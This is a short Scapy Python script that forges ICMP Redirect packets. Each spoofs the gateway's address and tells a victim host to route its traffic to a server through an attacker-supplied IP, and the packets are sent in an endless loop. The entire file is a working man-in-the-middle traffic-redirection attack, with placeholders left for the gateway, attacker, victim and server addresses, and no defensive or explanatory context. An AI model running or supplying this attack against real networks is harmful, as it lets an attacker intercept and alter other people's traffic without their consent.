```python
# Creating and sending ICMP redirect packets
originalRouterIP='<gateway IP>'
attackerIP='<attacker IP>'
victimIP='<victim IP>'
serverIP='<server IP>'
# We create an ICMP Redirect packet
ip=IP()
ip.src=originalRouterIP
ip.dst=victimIP
icmpRedirect=ICMP()
icmpRedirect.type=5
icmpRedirect.code=1
icmpRedirect.gw=attackerIP
# The ICMP packet payload /should/ contain the original TCP SYN packet
# sent from the victimIP
redirPayloadIP=IP()
redirPayloadIP.src=victimIP
redirPayloadIP.dst=serverIP
fakeOriginalTCPSYN=TCP()
fakeOriginalTCPSYN.flags="S"
fakeOriginalTCPSYN.dport=80
fakeOriginalTCPSYN.seq=444444444
fakeOriginalTCPSYN.sport=55555
while True:
	send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)

# execute above in scapy
```